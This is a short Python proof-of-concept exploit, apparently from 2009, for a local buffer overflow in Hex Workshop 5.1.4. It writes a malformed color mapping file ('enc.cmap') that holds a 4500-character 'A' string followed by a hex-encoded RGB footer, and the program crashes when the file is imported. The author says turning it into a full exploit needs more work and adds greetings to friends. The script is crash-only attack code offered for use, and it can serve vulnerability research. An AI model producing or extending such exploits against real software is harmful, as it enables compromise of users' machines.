# Hex Workshop 5.1.4 (Color Mapping File) Local Buffer Overflow Poc
# other versions are affected 
# 
# By:Encrypt3d.M!nd
# Merry Christmas & Happy New Year 2009
#
# Greetz:-=Mizo=-(Perra :-l),L!0N,El Mariachi,MiNi SpIder,GGY,and all my friends
################################################################################
#
# Just import (enc.cmap) From (Tools>Color Mapping) And See What Happen ^_^
# I Think it's Easy To Exploit but need some work *_^

chars = "A"*4500

foot = "\x20\x3D\x20\x52\x47\x42\x28\x30\x2C\x20\x30\x2C\x20\x30\x29\x2C\x20\x52\x47\x42\x28\x31\x36\x30\x2C\x20\x31\x36\x30\x2C\x20\x31\x36\x30\x29"

file=open('enc.cmap','w+')
file.write("\x22"+chars+"\x22"+foot)
file.close()

